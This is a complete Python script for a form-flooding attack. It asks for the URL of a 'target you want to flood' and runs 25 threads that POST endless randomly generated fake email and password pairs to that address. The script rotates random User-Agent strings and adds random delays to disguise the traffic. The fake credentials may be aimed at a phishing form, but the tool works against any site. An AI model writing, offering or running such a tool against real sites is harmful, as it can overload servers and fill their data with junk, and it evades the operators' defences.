import threading
import requests
import random
import string
import names
from fake_useragent import UserAgent
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def name_gen():
    """Generates a random name for the email."""
    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    if name_system == "FullName":  # JohnDoe
        return first_name + last_name
    elif name_system == "FullFirstFirstInitial":  # JohnD
        return first_name + last_name[0]
    else:  # JDoe
        return first_name[0] + last_name

def generate_random_email():
    """Generates a random email address."""
    name = name_gen()
    add_number = random.choice([True, False])
    domain = random.choice([
        "@gmail.com", "@yahoo.com", "@rambler.ru", 
        "@protonmail.com", "@outlook.com", "@itunes.com"
    ])  # Popular email providers
    if add_number:
        return f"{name}{random.randint(1, 100)}{domain}"
    else:
        return f"{name}{domain}"

def generate_random_password():
    """Generates a random password."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))

def send_post_request(url):
    """Sends POST requests with random email and password to the specified URL."""
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {"a": email, "az": password}
        user_agent = UserAgent().random
        headers = {'User-Agent': user_agent}
        
        try:
            response = requests.post(url, data=data, headers=headers)
            logging.info(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, User-Agent: {user_agent}")
            
            if response.status_code != 200:
                logging.error(f"Error: Received status code {response.status_code}")
                
            time.sleep(random.uniform(1, 5))  # Random delay between 1 and 5 seconds

        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying
        except Exception as e:
            logging.error(f"An unexpected error occurred: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying

def main():
    url = input("Enter the URL of the target you want to flood: ")
    threads = [threading.Thread(target=send_post_request, args=(url,), daemon=True) for _ in range(25)]

    for t in threads:
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
